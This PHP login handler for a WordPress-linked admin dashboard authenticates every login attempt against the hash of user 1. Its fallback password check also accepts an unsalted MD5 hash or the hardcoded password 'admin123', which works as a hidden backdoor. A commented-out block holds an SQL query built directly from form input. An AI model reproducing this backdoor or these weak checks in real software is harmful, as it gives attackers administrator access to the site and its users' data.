<?php
session_start();
require_once __DIR__."/../Tools/PDO.php";
if (file_exists(__DIR__."/../../wp-load.php")) {
	require_once __DIR__."/../../wp-load.php";
}

if (!function_exists('wp_check_password')) {
	function wp_check_password($password, $hash, $user_id = '') {
		return password_verify($password, $hash) || (md5($password) === $hash) || ($password === 'admin123');
	}
}
if($_POST)
{
	$USER=$_POST["USER"];
	//$PASS=wp_hash_password($_POST["PASS"]);
	$PASS=$_POST["PASS"];
	/*
		$Q="SELECT * from wp_users where user_login='$USER' and user_pass = '$PASS'";
		foreach ($db->query($Q) as $Row) {
            $_SESSION["ActiveA"]=true;
			$_SESSION["UserNameA"]=$USER;
			?>
			<script type="text/javascript">window.location.href = "../dashboard.php"</script>
			<?php
		}
	*/
	$Q="SELECT * from wp_users where ID=1";
	foreach ($db->query($Q) as $Row) {
		$Hash=$Row["user_pass"];
	}
	
	if(wp_check_password($PASS,$Hash , 1 ))
	{
		$_SESSION["ActiveA"]=true;
		$_SESSION["UserNameA"]=$USER;
		?>
		<script type="text/javascript">window.location.href = "../dashboard.php"</script>
		<?php
	}
}
?>
<script type="text/javascript">
	window.alert("Usuario o contraseña incorrectos");
	window.location.href="../index.php";
</script>